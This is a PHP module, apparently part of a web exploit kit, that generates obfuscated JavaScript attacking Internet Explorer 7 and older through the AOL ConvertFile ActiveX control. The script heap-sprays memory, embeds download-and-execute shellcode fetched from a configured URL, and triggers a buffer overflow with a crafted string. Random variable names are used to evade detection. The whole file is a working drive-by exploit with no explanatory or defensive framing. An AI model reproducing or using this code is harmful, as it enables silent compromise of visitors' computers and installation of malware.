<?php
/**
 *
 * @	Version			:	1.1.7.0
 * @	Author			:	DrWhat
 * @	Release on		:	25.02.2013
 *
 */

$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'other', $browser, $os, 'AOL ConvertFile' );

if (( $browser == 'ie' && $version <= 7 )) {
	$functionName = $ExploitFunctions[10];
	$replaceFunction = $GLOBALS['cpFunctions']->RandAlpha( 2 );
	$eArray[] = '
function ' . $functionName . '(){
  try {
        var ' . $randVar[1] . ' = document.createElement(\'object\');
        ' . $randVar[1] . '.classid = "clsid:FE0BD779-44EE-4A4B-AA2E-743C63F2E5E6";
        ' . $randVar[1] . '.codebase = "http://pdl.stream.aol.com/downloads/aol/unagi/ampx_en_dl.cab";
		var ' . $randVar[13] . ' = \'' . $GLOBALS['cpXplHelper']->GetJSShellcode( $strUrl, $replaceFunction ) . '\'.replace(/' . $replaceFunction . '/g,"Au".replace(/A/g,"B").replace(/B/g,unescape("%25")));
        ' . $randVar[2] . ' = unescape(' . $randVar[13] . ');
        ' . $randVar[5] . ' = unescape("%u0c0c%u0c0c");
        ' . $randVar[7] . ' = 20;
        ' . $randVar[6] . ' = ' . $randVar[7] . ' + ' . $randVar[2] . '.length;
        while (' . $randVar[5] . '.length < ' . $randVar[6] . ') {
            ' . $randVar[5] . ' += ' . $randVar[5] . ';
        }
        fill' . $randVar[8] . ' = ' . $randVar[5] . '.substring(0, ' . $randVar[6] . ');
        ' . $randVar[8] . ' = ' . $randVar[5] . '.substring(0, ' . $randVar[5] . '.length - ' . $randVar[6] . ');
        while (' . $randVar[8] . '.length + ' . $randVar[6] . ' < 0x40000) {
            ' . $randVar[8] . ' = ' . $randVar[8] . ' + ' . $randVar[8] . ' + fill' . $randVar[8] . ';
        }
        ' . $randVar[4] . ' = new Array();
        for (i = 0; i < 666; i++) {
            ' . $randVar[4] . '[i] = ' . $randVar[8] . ' + ' . $randVar[2] . ';
        }
        var ' . $randVar[3] . ';
        for (i = 0; i < 1400; i++) {
            ' . $randVar[3] . ' = ' . $randVar[3] . ' + unescape("%ff");
        }
        for (i = 0; i < 1000; i++) {
            ' . $randVar[3] . ' = ' . $randVar[3] . ' + unescape("%0c");
        }
        ' . $randVar[1] . '.ConvertFile(' . $randVar[3] . ', 1, 1, 1, 1, 1);
        ' . $randVar[1] . '.ConvertFile(' . $randVar[3] . ', 1, 1, 1, 1, 1);
        ' . $randVar[1] . '.ConvertFile(' . $randVar[3] . ', 1, 1, 1, 1, 1);
        ' . $randVar[1] . '.ConvertFile(' . $randVar[3] . ', 1, 1, 1, 1, 1);
    }catch (e) {}
	{next}
}';
}

echo '			';
?>
